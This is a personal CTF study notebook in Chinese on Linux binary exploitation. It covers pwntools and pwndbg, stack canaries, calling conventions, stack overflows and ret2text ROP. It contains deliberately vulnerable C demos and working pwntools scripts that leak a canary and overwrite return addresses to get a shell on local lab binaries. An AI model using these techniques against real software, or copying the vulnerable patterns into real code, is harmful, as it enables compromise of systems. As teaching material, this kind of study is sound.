- writer: github.com/hex-16   data: from 2020   contact: hexhex16@outlook.com
- 未加说明时，默认系统为kali 20.04(64bit), python3.7或以上, 其余套件为2021.3前后的最新版
- 部分内容与 Reverse.md 有重叠，部分交叉内容会记录在Reverse.md 中，会有注明

# Pwn

> spelled "pone". like "p" own
>
> pwn的源起以及被广泛地普遍使用的原因：魔兽争霸某段讯息上设计师打字时拼错，原本应是own。 'p' 与 'o' 在标准英文键盘上位置相邻

- pwn是一个骇客语法的俚语词，自"own"这个字引申出来的
- 在计算机技术领域，pwn一般指攻破(to compromise, 危及, 损害)，或是控制(to control)

> Linux中的GOT和PLT到底是个啥？   https://www.freebuf.com/articles/system/135685.html 



## checksec





## pwndbg

> https://github.com/pwndbg/pwndbg
>
> https://blog.csdn.net/Breeze_CAT/article/details/103789233  指令参考

Installation:

1. `git clone https://github.com/pwndbg/pwndbg`
2. `cd pwndbg`
3. `chmod 777 ./setup.sh`
4. `./setup.sh`

- 安装完成后，使用`gdb`指令后，命令行左侧显示的是`pwndbg`

> 如何使用pwndbg见 Reverse.md. Dynamic Analysis: pwndbg
>
> 实践使用案例见对应writeup



## pwntools

> python包    Github repo: https://github.com/Gallopsled/pwntools
>
> docs: https://docs.pwntools.com/en/latest/

- pwn工具集. `pwntools` is a CTF framework and exploit development library. CTF框架，python包
- WARNING: 网上很多使用pwntools的脚本是基于python2的，需要注意str byte转换，以及可能存在的API行为改变

```python
from pwn import *
io = remote("127.0.0.1", 32152)
# 与互联网主机交互
io.sendline("hello") # sendline发送数据会在最后多添加一个回车
io.send("hello") # 不会添加回车

io.recv(1024) # 读取1024个字节
io.recvuntil() # 读取一直到回车
io.recvline("hello") # 读取到指定数据

io.interactive()
```



```python
io = process("./bin", shell=True) # 启动本地程序进行交互，用于gdb调试

io.p32(0xdeadbeef)
io.p64(0xdeadbeefdeadbeef)
io.u32("1234")
io.u64("12345678")
# 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword
```



### Installation

> (2021.3) 官方文档建议使用python3

```bash
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```



### Tutorials

> https://docs.pwntools.com/en/latest/intro.html
>
> 使用`from pwn import *`后，quick list of most of the objects and routines imported: https://docs.pwntools.com/en/latest/globals.html





#### Connections

```python
# 创建远程连接，
conn = remote('ftp.ubuntu.com', 21) # in pwnlib.tubes.remote # 域名/IP, Port
conn.recvline() # doctest: +ELLIPSIS # b'220 ...'
conn.send(b'USER anonymous\r\n') # 需要手动添加\r\n
conn.recvuntil(b' ', drop=True) # b'331'
conn.recvline() # b'Please specify the password.\r\n'
conn.close()
```

```python
# spin up a listener
l = listen() # 创建一个sock用于监听
r = remote('localhost', l.lport) # 连接刚刚创建的连接l的监听端口 lport
c = l.wait_for_connection() # 等待连接
r.send(b'hello')
c.recv() # b'hello'
```

```python
# Interacting with processes # 与进程交互
sh = process('/bin/sh') # pwnlib.tubes.process
sh.sendline(b'sleep 3; echo hello world;') # 会自动添加\r\n
sh.recvline(timeout=1) # b'' # 因为上面执行的命令首先为sleep 3，这里超时后未接收到字符串
sh.recvline(timeout=5) # b'hello world\n'
sh.close()
```

```python
# Not only can you interact with processes programmatically, but you can actually interact with processes.
>>> sh.interactive() # doctest: +SKIP # 将代码交互转换为手工交互
$ whoami
user
```



```python
# There’s even an SSH module for when you’ve got to SSH into a box to perform a local/setuid exploit with pwnlib.tubes.ssh. You can quickly spawn processes and grab the output, or spawn a process and interact with it like a process tube. # ssh连接
shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
shell['whoami'] # b'bandit0'
shell.download_file('/etc/motd')
sh = shell.run('sh')
sh.sendline(b'sleep 3; echo hello world;') 
sh.recvline(timeout=1) # b''
sh.recvline(timeout=5) # b'hello world\n'
shell.close()
```





#### Packing Integers

- 在python表示的整数和字节序列表示之间转换

```python
import struct
p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef) # True # 两者等效
leet = unhex('37130000')
u32(b'abcd') == struct.unpack('I', b'abcd')[0] # True # 两者等效
u8(b'A') == 0x41 # True # 两者等效
```



#### Target Architecture, OS, Logging

```python
context.binary = './challenge-binary' # 自动设置所有适当的值 # 官方文档推荐方法
print(context) # example output:
# ContextType(arch = 'i386', binary = ELF('/home/kali/CTF/pwn/ret2shellcode'), bits = 32, endian = 'little', os = 'linux')
```



```python
asm('nop') # b'\x90'
asm('nop', arch='arm') # b'\x00\xf0 \xe3'
# set once in the global `context`
context.arch      = 'i386'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 32
```

```python
# asm context 方法对比
asm('nop') # b'\x90'
context(arch='arm', os='linux', endian='big', word_size=32)
asm('nop') # b'\xe3 \xf0\x00'
```

```python
# set logging level
context.log_level = 'debug'
```

#### Assembly and Disassembly

> `pwnlib.asm`

```python
enhex(asm('mov eax, 0')) # 'b800000000'  # assembly to machine code # 汇编转机器码(hex)
print(disasm(unhex('6a0258cd80ebf9'))) # machine code to readable assembly
# Output: 
   0:   6a 02                   push   0x2
   2:   58                      pop    eax
   3:   cd 80                   int    0x80
   5:   eb f9                   jmp    0x0
```





#### ELF Manipulation

```python
e = ELF('/bin/cat')
print(hex(e.address)) #doctest: +SKIP # 0x400000
print(hex(e.symbols['write'])) #doctest: +SKIP # 0x401680
print(hex(e.got['write'])) #doctest: +SKIP # 0x60b070
print(hex(e.plt['write'])) #doctest: +SKIP # 0x401680

# patch and save the files # 打补丁并保存
e = ELF('/bin/cat')
e.read(e.address, 4) # b'\x7fELF'
e.asm(e.address, 'ret') # 将 e.address 地址处的汇编改为 ret
e.save('/tmp/quiet-cat')
disasm(open('/tmp/quiet-cat','rb').read(1))
'   0:   c3                      ret'
```



### Cases







---

# Linux Pwn



`checksec` Installation

- 实际上有些app, module已经包含`checksec`, e.g. miniconda3, pwntools

```bash
git clone https://github.com/slimm609/checksec.sh
cd checksec.sh
chmod 777 ./checksec
env | grep PATH # 查看系统路径包含哪些
sudo cp ./checksec /usr/bin # 这里的路径是上面 PATH 中出现的其中一个 # 只要是 PATH 中出现过的路径都可以
```

```bash
checksec filename   # 使用方法
```





## 安全防护机制



### Canary

> 栈的警惕标志 stack canary
>
> 金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的，预警用的金丝雀
>
> 这里指解决栈溢出问题的一种漏洞缓解措施

- 在栈的返回地址的存储位置之前放置一个整形值，该值在装入程序时随机确定。栈缓冲区攻击时从低地址向高地址覆盖栈空间，因此会在覆盖返回地址之前就覆盖了警惕标志。返回前会检查该警惕标志是否被篡改，判断 stack/buffer overflow 是否发生
- 通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖 ebp、eip 等，从而达到劫持控制流的目的
- 栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)
- 攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将这种 cookie 信息称为 Canary
- 由于 stack overflow 而引发的攻击非常普遍也非常古老，相应地一种叫做 Canary 的 mitigation 技术很早就出现在 glibc 里，直到现在也作为系统安全的第一道防线存在
- Canary 与 Windows 下的 GS 保护都是缓解栈溢出攻击的有效手段，它的出现很大程度上增加了栈溢出攻击的难度，并且由于它几乎并不消耗系统资源，所以现在成了 Linux 下保护机制的标配



#### Canary原理

- 在GCC中使用以下参数设置 Canary

```bash
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护
-fno-stack-protector 禁用保护
```

- 开启 Canary 保护的 stack 结构大概如下：

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | local variables |
        Low     |                 |
        Address
```

当程序启用 Canary 编译后，在**函数序言**部分会取 fs 寄存器 0x28 处的值，存放在栈中 `%ebp-0x8` 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：

```assembly
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。

```assembly
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

> FS寄存器 https://www.cnblogs.com/feiyucq/archive/2010/05/21/1741069.html 所述内容与本节所述的FS寄存器的貌似有些不同？

如果 Canary 已经被非法修改，此时程序流程会走到 `__stack_chk_fail`。`__stack_chk_fail` 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。

```c
// eg libc-2.19/debug/stack_chk_fail.c
void __attribute__ ((noreturn)) __stack_chk_fail (void){
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>");
}
```

这意味可以通过劫持 `__stack_chk_fail` 的 got 值劫持流程或者利用 `__stack_chk_fail` 泄漏内容 (参见 stack smash)。

对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。

```c
typedef struct{
  void *tcb;   // Pointer to the TCB.  Not necessarily the thread descriptor used by libpthread.
  dtv_t *dtv;
  void *self;  // Pointer to the thread descriptor.
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```

如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。

事实上，TLS 中的值由函数 security_init 进行初始化

```c
static void
security_init (void){
  // _dl_random的值在进入这个函数的时候就已经由kernel写入.
  // glibc直接使用了_dl_random的值并没有给赋值
  // 如果不采用这种模式, glibc也可以自己产生随机数

  //将_dl_random的最后一个字节设置为0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);

  // 设置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用于设置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
```



#### Canary 绕过

Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。



- 示例代码：`gcc -m32 -no-pie -fstack-protector-all ex2.c -o ex2`

```c
// ex2.c # 编译为 32bit 程序并关闭 PIE 保护 （并开启 NX，ASLR，Canary 保护）
// gcc -m32 -no-pie -fstack-protector-all canary_demo.c -o ex2
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
void getshell(void) {
    system("/bin/sh");
}
void init() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}
void vuln() {
    char buf[100];
    for(int i=0;i<2;i++){
        read(0, buf, 0x200);
        printf(buf);
    }
}
int main(void) {
    init();
    puts("Hello Hacker!");
    vuln();
    return 0;
}
```



![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_canary_function_demo.png)

- 上图为IDA中显示的`vuln`函数的汇编指令。`var_C`为canary值

```assembly
; Stack of vuln ; Two special fields " r" and " s" represent return address and saved registers.
-00000075                 db ? ; undefined
-00000074 var_74          dd ?
-00000070 buf             db 100 dup(?)           ; string(C)
-0000000C var_C           dd ? ; 这个就是canary值 # 4 byte
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004 var_4           dd ? ; 原本寄存器 ebx 的值
+00000000  s              db 4 dup(?) ; 从上图左边绿色的栈高度可以看出，s是原本的 ebp 的值
+00000004  r              db 4 dup(?) ; 函数的返回地址
+00000008
+00000008 ; end of stack variables
```





##### 泄露栈中的 Canary

- Canary 设计为以字节 `\x00` 结尾，本意是为了保证 Canary 可以截断字符串。
- 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。
- 这种利用方式需要存在合适的输出函数，并且可能需要先溢出泄露 Canary，之后再次溢出控制执行流程。

```python
#!/usr/bin/env python
from pwn import *

context.binary = 'ex2'
#context.log_level = 'debug'
io = process('./ex2') # pwnlib.tubes.process.process
get_shell = ELF("./ex2").sym["getshell"]
print("get_shell:", type(get_shell), hex(get_shell)) # get_shell: <class 'int'> 0x80491b2
ret = io.recvuntil("Hello Hacker!\n") # <class 'bytes'> b'Hello Hacker!\n'

# leak Canary
payload = b"A" * 100 # buf[100] in .c, lead to stack overflow
io.sendline(payload) # pwnlib.tubes.tube.tube.sendline # 这里会以\n结尾 即 0xa # 总共发送的payload长度为 101 bytes
io.recvuntil("A" * 100) # recv output of printf(buf) in .c
recv_v = io.recv(4)

# 这里减去0xa是为了减去上面 io.sendline(payload) 最后的换行符，得到真正的 Canary
Canary = u32(recv_v) - 0xa 
log.info("Canary:" + hex(Canary))

# Bypass Canary
# as the stack shown in IDA: [buf 100byte]-[var_C]-[12byte]-[return_address]
payload = b"\x90" * 100 + p32(Canary) + b"\x90" * 12 + p32(get_shell)
payload = b"a" * 100 + p32(Canary) + b"a" * 12 + p32(get_shell)
io.send(payload)

io.recv()

io.interactive() # 将代码交互转换为手工交互
```

运行结果：调用`vuln`函数的返回值被覆盖为`getshell`的函数地址，可以获得所在主机的稳定shell

 ```assembly
 $ python canary.py
 [*] '/home/kali/CTF/pwn/ex2'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
 [+] Starting local process './ex2': pid 10221
 get_shell: <class 'int'> 0x80491b2
 [*] Canary:0xa5b35f00       ; 注意这里的值已经是将canary最后一个byte恢复成\x00后的原本的canary值了
 [*] Switching to interactive mode
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$ ls  ; 这里已经获取了 shell 用ls测试
 ex2.c  canary.py  core    ex2
 ```

 如果使用`context.log_level = 'debug'`, `io.sendline(b"A" * 100)`之后的输出如下：

 ```assembly
 [DEBUG] Received 0x6c bytes:
     00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
     *
     00000060  41 41 41 41  0a 5f b3 a5  10 a0 04 08               │AAAA│·_··│····│    ; 注意这里 0a 5f b3 a5 就是canary+0xa的值
 ```

 `0a 5f b3 a5`包含了101bytes的最后一个字符`\n`(0xa)，所在Linux系统为小端序，所以被覆盖的是canary的最后一个byte。而前面提到了canary值被设计以`\x00`结尾，所以这里需要将canary最后一个字节从`\x0a`恢复到原本的`\x00`



##### one-by-one 爆破 Canary

> 逐位爆破canary



##### 劫持`__stack_chk_fail` 函数



##### 覆盖 TLS 中储存的 Canary 值



## 栈溢出 Stack Buffer Overflow

> 栈缓冲区溢出（stack buffer overflow, stack buffer overrun）
>
> 函数调用栈基础知识参考链接：
>
> https://www.cnblogs.com/clover-toeic/p/3755401.html C语言函数调用栈(一)
>
> https://www.cnblogs.com/clover-toeic/p/3756668.html C语言函数调用栈(二)  包含x86函数返回值传递方法，暂未收录

- 栈帧是运行时概念，若程序不运行，就不存在栈和栈帧
- 但通过分析目标文件中建立函数栈帧的汇编代码(尤其是函数序和函数跋过程)，即使函数没有运行，也能了解函数的栈帧结构。通过分析可确定分配在函数栈帧上的局部变量空间准确值，函数中是否使用帧基指针，以及识别函数栈帧中对变量的所有内存引用

Stack Overflow Workflow:

1. 寻找危险函数。快速确定程序是否可能有栈溢出，栈溢出位置在哪。常见危险函数
   - input: `gets`, `scanf`, `vscanf`
   - output: `sprintf`
   - string:` strcpy`, `strcat`, `bcopy`
2. 确定填充长度。计算能够操作的地址与预期覆盖的地址之间的距离。通常打开IDA，根据给定的地址计算偏移。
   - 变量索引模式：
     - 相对于栈基址的索引: 通过查看EBP相对偏移获得
     - 相对于栈顶指针的索引: 一般需要调试，之后转换为相对于栈基址的索引
     - 直接地址索引: 相当于直接给定地址
   - 覆盖需求：(目的一般为 直接或间接控制程序执行流程)
     - 覆盖函数返回地址：直接看EBP
     - 覆盖栈上某个变量的内容：需精细计算
     - 覆盖bss段某个变量内容
     - 根据现实执行情况，覆盖特定的变量或地址的内容





32 位和 64 位程序有以下简单的区别

- x86
  - **函数参数**在**函数返回地址**的上方
- x64
  - System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前6个整型或指针参数依次保存在 **RDI, RSI, RDX, RCX, R8 和 R9 寄存器**中，如果还有更多的参数的话才会保存在栈上
  - 内存地址不能大于 0x00007FFFFFFFFFFF，**6 个字节长度**，否则会抛出异常





- 整数寄存器图表：

![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/interger_registers.png)



### 函数调用栈

- 函数调用栈的典型内存布局（x86-32bit）如下所示。包含caller和callee，包含寄存器和临时变量的栈帧布局

![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_function_stack_caller_and_callee.jpg)

- `m(%ebp)`表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)
- 该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于`12(%ebp)` 处；第二，每个参数都是4字节大小(栈的粒度为4字节)
- 函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分

函数调用时入栈顺序： 实参N\~1→主调函数返回地址→主调函数帧基指针EBP→被调函数局部变量1\~N



- 结构体成员变量的入栈顺序与其在结构体中声明的顺序相反
- 局部变量的布局依赖于编译器实现等因素。局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中。
- 数组/结构体型的局部变量通常分配在栈内存中

> 局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。
>
> 基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义



### 函数调用约定

函数调用约定通常规定如下几方面内容：

1. 函数参数的传递顺序和方式：最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能
2. 栈的维护方式：主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。清栈过程可由主调函数或被调函数负责完成。
3. 名字修饰(Name-mangling)策略(函数名修饰 Decorated Name 规则：编译器在链接时为区分不同函数，对函数名作不同修饰。若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定



#### cdecl

> C调用约定

- C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式
- 参数从右到左入栈，caller负责清除栈中的参数，返回值在EAX
- 由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)
- cdecl调用方式支持可变参数函数(e.g. `printf`)，且调用时即使实参和形参数目不符也不会导致堆栈错误
- 对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern "C"，C++函数使用不同的名字修饰方式

> ### 可变参数函数支持条件
>
> 1. 参数自右向左进栈
> 2. 由主调函数负责清除栈中的参数(参数出栈)
>
> 参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如`printf`函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错
>
> caller将参数压栈，只有caller知道栈中的参数数目和尺寸，因此caller可安全地清栈。而callee永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整
>
> C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态

#### stdcall

- Pascal程序缺省调用方式，WinAPI也多采用该调用约定
- 主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由callee清除栈中的参数，返回值在`EAX`
- `stdcall`调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，`stdcall`名称修饰方式是在函数名字前添加下划线，在函数名字后添加`@`和函数参数的大小，如`_functionname@number`



#### fastcall

- `stdcall`调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数从右向左入栈
- callee在返回前负责清除栈中的参数，返回值在`EAX`
- 因为并不是所有的参数都有压栈操作，所以比`stdcall`, `cdecl`快些
- 编译器使用两个`@`修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意`fastcall`函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突



#### thiscall

- C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数
- 编译器默认使用`thiscall`调用约定以高效传递和存储C++类的非静态成员函数的`this`指针参数
- `thiscall`调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。
- `thiscall`不是C++关键字，故不能使用`thiscall`声明函数，它只能由编译器使用
- 注意，该调用约定特点随编译器不同而不同，g++中`thiscall`与`cdecl`基本相同，只是隐式地将`this`指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在`%ecx`寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数

#### naked call

- 对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call
- 该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令
- naked call并非类型修饰符，故该调用约定必须与`__declspec`同时使用

> `__declspec`是微软关键字，其他系统上可能没有

| **调用方式**       | `stdcall(Win32)` | `cdecl` | `fastcall`                       | `thiscall(C++)`           | `naked call` |
| ------------------ | ---------------- | ------- | -------------------------------- | ------------------------- | ------------ |
| **参数压栈顺序**   | 右至左           | 右至左  | 右至左，Arg1在`ecx`，Arg2在`edx` | 右至左，`this`指针在`ecx` | 自定义       |
| **参数位置**       | 栈               | 栈      | 栈 + 寄存器                      | 栈，寄存器`ecx`           | 自定义       |
| **负责清栈的函数** | callee           | caller  | callee                           | callee                    | 自定义       |
| **支持可变参数**   | 否               | 是      | 否                               | 否                        | 自定义       |
| **函数名字格式**   | _name@number     | _name   | @name@number                     |                           | 自定义       |
| **参数表开始标识** | "@@YG"           | "@@YA"  | "@@YI"                           |                           | 自定义       |



- 不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而被调函数必然能自己完成正常清栈，因此，在跨(开发)平台调用中，通常使用stdcall调用约定(不少WinApi均采用该约定)



```c
// 采用C语言编译的库应考虑到使用该库的程序可能是C++程序(使用C++编译器)，通常应这样声明头文件
#ifdef _cplusplus
extern "C" { // 使用extern "C" 告知caller所在模块：callee是C语言编译的
#endif
    
int func(int para);
    
#ifdef _cplusplus
}
#endif
```

- 这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误





### 栈溢出原理

> https://www.cnblogs.com/rec0rd/p/7646857.html  关于Linux下ASLR与PIE的一些理解
>
> https://www.anquanke.com/post/id/85831 现代栈溢出利用技术基础：ROP

- 程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变
- 这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式
- 栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程

发生栈溢出的基本前提：

1. 程序向栈上写入数据
2. 写入数据的大小没有被良好控制

```bash
gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example
-m32 生成32bit程序
-fno-stack-protector 不开启堆栈溢出保护，即不生成 canary
-no-pie 不开启PIE(Position Independent Executable)，避免加载基址被打乱
```

```c
// 简单示例 stack_example.c // gcc -m32 -fno-stack-protector -no-pie stack_example.c -o stack_example
// 这一例子属于 ret2text
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

```bash
$ checksec example
[*] '/home/kali/CTF/pwn/example'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- IDA中vulnerable函数的栈显示如下：

```assembly
-00000014 s               db 16 dup(?)            ; string(C)
-00000004 var_4           dd ?
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
+00000008
+00000008 ; end of stack variables
```

```python
# coding=utf8   # 这个脚本执行后效果：可以看到 You Hava already controlled it. 字样，是success函数的输出
from pwn import *
# 构造与程序交互的对象
sh = process('./example')
success_addr = 0x08049172 # 这个是在IDA中分析得到的success函数的地址
# 0x14字节对应字符串s和var_4 # 4个b对应保存的寄存器s # 然后紧跟的就是success函数地址 用于覆盖原本的函数返回地址
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr) # 构造payload 
sh.sendline(payload) # 向程序发送字符串
sh.interactive() # 将代码交互转换为手工交互
```



### Linux ASLR修改

修改`/proc/sys/kernel/randomize_va_space`来控制ASLR启动与否，具体选项：

- 0: 关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同
- 1: 普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化
- 2: 增强的 ASLR，在 1 的基础上，增加了堆基地址随机化

可以使用`echo 0 > /proc/sys/kernel/randomize_va_space`关闭Linux系统的ASLR。kali20.04测试时需用`sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"`





### ROP

> ROP(Return Oriented Programming)
>
> 核心在于利用指令集中的 `ret` 指令，改变了指令流的执行顺序

- 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)
- 在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程**
- gadgets: 以 `ret` 结尾的指令序列，通过这些指令序列，可修改某些地址的内容，以控制程序的执行流程

所需条件：

1. 程序存在溢出，且可以控制返回地址
2. 可以找到满足条件的gadgets以及相应gadgets的地址(若 gadgets 地址不固定，就需要想办法动态获取对应的地址)



#### ret2text

> return to .text of the executable program
>
> 栈溢出原理中所举例子属于该类别

- 控制程序执行程序本身的代码段(.text)
- 也可以控制程序执行好几段不相邻的已有代码(gadgets)
- 需要知道对应的返回的代码的位置

> 案例ret2text见  https://github.com/hex-16/CTF-detailed-writeups/tree/main/pwn/demo_ROP_ret2text , 所使用的脚本：
>
> ```python
> # python3 pwntools # demo_ROP_ret2text
> from pwn import *
> sh = process('./ret2text')
> target = 0x804863a # 这个是 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
> payload = b'A' * (0x6c + 4) + p32(target) # 这里是前面分析的字符串 s 与 return address 之间的偏移量
> sh.sendline(payload)
> sh.interactive()
> ```
>
> 该案例总结：
>
> 1. IDA分析出危险函数(`gets`)
> 2. IDA分析出可以用于getshell的地方(`system("/bin/sh");`)，记录可以 getshell 的地址
> 3. gdb(pwndbg)分析出`gets`函数所用字符串 s 与 return address 之间的偏移量，构造payload，将用于getshell的地址覆盖到 return address
>
> 比赛案例：
>
> - NahamCon 2021 (ctf.nahamcon.com): Ret2basic: 没开canary等保护，找到打开`flag.txt`的函数，覆盖return address就行了，栈分析可以用gdb也可以用IDA(没分析错)。
>
> ```python
